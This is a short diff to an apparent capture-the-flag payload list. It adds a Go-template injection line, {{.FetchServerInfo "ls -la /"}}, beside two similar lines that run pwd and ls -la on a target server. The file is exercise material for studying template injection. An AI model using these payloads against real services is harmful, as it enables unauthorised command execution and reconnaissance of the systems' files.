@@ -1,2 +1,3 @@
 Get Flag {{.FetchServerInfo "pwd"}}
 Get Flag {{.FetchServerInfo "ls -la"}}
+Get Flag {{.FetchServerInfo "ls -la /"}}
